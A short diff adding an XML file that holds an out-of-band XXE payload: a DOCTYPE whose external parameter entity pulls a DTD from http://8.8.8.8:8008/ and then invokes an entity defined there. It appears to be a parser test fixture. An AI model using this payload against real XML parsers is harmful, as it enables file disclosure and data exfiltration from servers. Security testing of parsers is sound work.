@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE a [
+   <!ENTITY % b SYSTEM "http://8.8.8.8:8008/"> 
+   %b; 
+   %e; 
+]>
+<a></a>
